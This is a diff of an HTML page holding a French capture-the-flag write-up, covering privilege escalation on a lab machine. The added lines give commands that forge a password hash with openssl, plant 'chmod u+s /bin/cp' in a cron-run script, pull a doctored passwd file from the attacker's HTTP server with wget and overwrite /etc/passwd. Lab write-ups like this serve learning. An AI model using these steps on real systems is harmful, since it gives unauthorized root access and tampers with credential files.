@@ -64,8 +64,19 @@
             <img class="displayed" src="../../img/pass.PNG" alt="grrrr">
             <p>On peut maitenant accéder au user lennie en faisant su lennie, cd /home/lennie puis ls et bingo
                on chope le flag user.txt. Enfin pour le privesc j'ai tout simplement modifier le /etc/passwd afin de pouvoir me connecter en tant que vragrant(user)
-               qui lui possède les droits d'administrateur. Pour cela 
+               qui lui possède les droits d'administrateur. Pour cela on copie le /etc/passwd de la
+               machine victime dans un fichier nommé passwd sur notre machine. Une fois cela fait on génére un 
+               salt password avec la commande suivant <span style="color: #007bff; background: rgb(21 27 39 / 10%) ;">openssl passwd -1 -salt abc 123</span>               
             </p>
+            <img  class="displayed "src="../../img/salt.PNG" alt="bzzzzt">
+            <p>Puis on copie le salt dans notre fichier passwd que l'on a crée à la place du X juste à coté du USER
+               Maintenant on modifie le fichier print.sh en y metttant chmod u+s /bin/cp à la place de echo 'Done'.
+               Une fois cela fait on attend 1 à 2 minutes et pendant ce temps on met un petit serveur http en place avec python :
+               python -m SimpleHTTPServer 80 afin de transférer le file et on le download la directory /tmp :
+               wget http://votreIP/passwd puis cp passwd /etc/passwd et voila le tour est jouer on a plus qu'à se
+               connecter en tant que vagrant avec le password 123 et de cat le flag root.txt
+            </p>
+            <img  class="displayed "src="../../img/root.jpg" alt="rrrrrrrr">
 
         </section>
     </div>
